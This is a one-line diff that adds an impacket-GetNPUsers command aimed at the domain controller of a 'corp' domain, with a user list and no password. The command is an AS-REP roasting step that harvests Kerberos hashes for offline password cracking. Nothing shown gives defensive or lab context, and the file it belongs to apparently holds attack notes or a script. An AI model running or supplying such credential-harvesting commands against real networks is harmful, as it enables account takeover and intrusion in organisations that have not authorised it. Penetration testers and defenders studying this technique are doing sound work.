@@ -1,0 +1,1 @@
+impacket-GetNPUsers corp/ -dc-ip 192.168.65.10 -usersfile users.txt -no-pass
